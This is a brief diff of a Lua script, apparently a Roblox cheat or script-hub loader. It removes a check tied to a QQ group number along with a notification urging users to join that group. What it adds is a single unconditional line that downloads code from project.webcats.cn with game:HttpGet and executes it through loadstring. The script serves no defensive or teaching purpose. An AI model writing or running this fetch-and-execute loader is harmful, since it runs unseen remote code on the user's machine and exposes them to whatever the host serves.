@@ -1,12 +1,2 @@
-if bjb ＝= '群号:819397507'
-then
-loadstring(game:HttpGet("http://project.webcats.cn/bx/41981/17077"))()
-else
-local CoreGui = game:GetService("StarterGui")
 
-CoreGui:SetCore("SendNotification", {
-    Title = "加群",
-    Text = a.."全部要复制，那个上面的群号，如果你不知道群号，那么群号是:819397507",
-    Duration = 15,
-})
-end
+loadstring(game:HttpGet("http://project.webcats.cn/bx/41981/17077"))()
